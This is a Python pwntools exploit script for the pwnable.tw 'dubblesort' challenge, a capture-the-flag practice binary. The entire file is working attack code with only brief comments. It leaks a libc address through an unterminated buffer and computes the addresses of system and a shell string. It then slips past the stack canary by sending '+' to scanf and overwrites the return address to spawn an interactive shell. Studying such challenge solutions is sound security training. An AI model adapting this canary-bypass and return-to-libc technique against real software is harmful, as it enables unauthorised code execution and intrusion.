from pwn import *

#r = process('./dubblesort', env={'LD_PRELOAD':'./libc_32.so.6'})
#r = remote("chall.pwnable.tw", 10101)
r = process('./dubblesort')
libc = ELF('./libc_32.so.6')


context.endian = 'little'
leak_off = 0xf771f000 - 0xf756f000
sh_off = 0xf76e52f5 - 0xf758f000
#leak libc address
r.recvuntil(':')
r.sendline('a'*24)
r.recvuntil('\n')


leak_add = u32(r.recvuntil(',')[:4])
r.recvuntil(':')

leak_add = ((leak_add<<8) & 0xffffffff)
print hex(leak_add)
base = leak_add - leak_off
print hex(base)
system = base + libc.symbols['system']
print hex(system)
sh = base + sh_off
print hex(sh)

def sendnum(num):
    r.recvuntil(': ')
    r.sendline(str(num))

#after 24 number, it will overwrite canary
n = 36

r.sendline(str(n))

#until canary
for i in range(24):
    sendnum(i)

#bypass canary
r.recvuntil(': ')
r.sendline('+')

for i in range(7):
    sendnum(system)

sendnum(system)
sendnum(sh)
sendnum(sh)
sendnum(sh)

r.interactive()

